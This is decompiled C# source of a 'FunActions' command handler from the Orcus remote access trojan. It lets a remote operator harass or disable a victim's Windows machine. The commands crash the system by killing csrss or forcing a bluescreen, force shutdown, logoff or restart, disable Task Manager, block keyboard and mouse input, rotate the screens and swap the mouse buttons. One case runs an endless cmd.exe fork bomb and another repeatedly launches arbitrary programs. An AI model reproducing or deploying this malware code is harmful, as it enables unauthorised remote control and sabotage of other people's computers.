using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using Orcus.Native;
using Orcus.Native.Display;
using Orcus.Plugins;
using Orcus.Shared.Commands.FunActions;
using Orcus.Utilities;

namespace Orcus.Commands.FunActions;

internal class FunActionsCommand : Command
{
	private Computer.DesktopWallpaperRestoreInfo _desktopWallpaperRestoreInfo;

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Expected I4, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Invalid comparison between Unknown and I4
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b5: Expected I4, but got Unknown
		//IL_03bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03be: Invalid comparison between Unknown and I4
		//IL_03ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cd: Invalid comparison between Unknown and I4
		//IL_03e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e3: Invalid comparison between Unknown and I4
		FunActionsCommunication val = (FunActionsCommunication)parameter[0];
		switch ((int)val)
		{
		default:
			throw new ArgumentOutOfRangeException();
		case 0:
		case 1:
			Taskbar.IsVisible = (int)val == 1;
			break;
		case 2:
			Mouse.Hold(TimeSpan.FromSeconds(BitConverter.ToInt32(parameter.Skip(1).ToArray(), 0)));
			break;
		case 3:
		{
			if (User.IsAdministrator)
			{
				try
				{
					Process.GetProcessesByName("csrss")[0].Kill();
				}
				catch (Exception ex)
				{
					try
					{
						BluescreenTool.Trigger();
					}
					catch (Exception ex2)
					{
						List<byte> list2 = new List<byte> { 3 };
						list2.AddRange(Encoding.UTF8.GetBytes(ex.Message + " / " + ex2.Message));
						connectionInfo.CommandFailed((Command)(object)this, list2.ToArray());
						return;
					}
				}
				break;
			}
			List<byte> list3 = new List<byte> { 3 };
			list3.AddRange(Encoding.UTF8.GetBytes("No admin rights and service isn't running"));
			connectionInfo.CommandFailed((Command)(object)this, list3.ToArray());
			return;
		}
		case 4:
			Monitor.TurnOff();
			break;
		case 5:
			Process.Start("shutdown.exe", "/s /t 0");
			break;
		case 6:
			Process.Start("shutdown.exe", "/l /t 0");
			break;
		case 7:
			Process.Start("shutdown.exe", "/r /t 0");
			break;
		case 8:
		{
			RotateDegrees val2 = (RotateDegrees)parameter[1];
			switch (Display.RotateAllScreens((int)val2 switch
			{
				0 => Display.Orientations.DEGREES_CW_0, 
				1 => Display.Orientations.DEGREES_CW_90, 
				2 => Display.Orientations.DEGREES_CW_180, 
				3 => Display.Orientations.DEGREES_CW_270, 
				_ => throw new ArgumentOutOfRangeException(), 
			}))
			{
			default:
				throw new ArgumentOutOfRangeException();
			case DISP_CHANGE.BadDualView:
			case DISP_CHANGE.BadParam:
			case DISP_CHANGE.BadFlags:
			case DISP_CHANGE.NotUpdated:
			{
				List<byte> list = new List<byte> { 8 };
				list.AddRange(Encoding.UTF8.GetBytes("The screen was not updated"));
				connectionInfo.CommandFailed((Command)(object)this, list.ToArray());
				break;
			}
			case DISP_CHANGE.BadMode:
			{
				List<byte> list = new List<byte> { 8 };
				list.AddRange(Encoding.UTF8.GetBytes("The graphics mode is not supported (BADMOVE)"));
				connectionInfo.CommandFailed((Command)(object)this, list.ToArray());
				break;
			}
			case DISP_CHANGE.Failed:
				connectionInfo.CommandFailed((Command)(object)this, new byte[1] { 8 });
				break;
			case DISP_CHANGE.Restart:
			{
				List<byte> list = new List<byte> { 8 };
				list.AddRange(Encoding.UTF8.GetBytes("System restart required"));
				connectionInfo.CommandFailed((Command)(object)this, list.ToArray());
				break;
			}
			case DISP_CHANGE.Successful:
				break;
			}
			break;
		}
		case 9:
		{
			Computer.MinimizeAllScreens();
			Thread.Sleep(1000);
			Bitmap val3 = ImageUtilities.TakeScreenshot();
			try
			{
				Computer.SetDesktopWallpaper((Image)(object)ImageUtilities.RotateScreenshotScreenByScreen(val3), Computer.Style.Tiled, out _desktopWallpaperRestoreInfo);
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			Computer.ToggleDesktopIcons();
			Display.RotateAllScreens(Display.Orientations.DEGREES_CW_180);
			Taskbar.Hide();
			KeyboardLayout.SwitchTo(2060u);
			break;
		}
		case 10:
			Computer.ToggleDesktopIcons();
			Display.ResetAllRotations();
			Taskbar.Show();
			KeyboardLayout.SwitchTo(1031u);
			_desktopWallpaperRestoreInfo?.Restore();
			break;
		case 11:
		{
			uint layoutId;
			switch (parameter[1])
			{
			default:
				return;
			case 0:
				layoutId = 1033u;
				break;
			case 1:
				layoutId = 1031u;
				break;
			case 2:
				layoutId = 2060u;
				break;
			}
			KeyboardLayout.SwitchTo(layoutId);
			break;
		}
		case 12:
		{
			int num = BitConverter.ToInt32(parameter, 1);
			string @string = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);
			for (int i = 0; i < num; i++)
			{
				Process.Start(@string);
			}
			break;
		}
		case 13:
		case 14:
			WindowsModules.SetDesktopVisibility((int)val == 13);
			break;
		case 15:
		case 16:
			WindowsModules.SetClockVisibility((int)val == 15);
			break;
		case 17:
		case 18:
			if (User.IsAdministrator)
			{
				WindowsModules.SetTaskManager((int)val == 17);
				break;
			}
			connectionInfo.CommandFailed((Command)(object)this, new byte[1] { parameter[0] });
			return;
		case 19:
			Computer.SwapMouseButtons();
			break;
		case 20:
			Computer.RestoreMouseButtons();
			break;
		case 21:
			if (User.IsAdministrator)
			{
				BlockUserInput.Block(BitConverter.ToInt32(parameter, 1));
				break;
			}
			connectionInfo.CommandFailed((Command)(object)this, new byte[1] { parameter[0] });
			return;
		case 22:
			DesktopWallpaper.Set(Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2), (DesktopWallpaperStyle)parameter[1]);
			break;
		case 23:
		{
			ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe");
			while (true)
			{
				Process.Start(startInfo);
			}
		}
		case 24:
			NativeMethods.mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
			break;
		case 25:
			NativeMethods.mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
			break;
		}
		connectionInfo.CommandSucceed((Command)(object)this, new byte[1] { parameter[0] });
	}

	protected override uint GetId()
	{
		return 8u;
	}
}
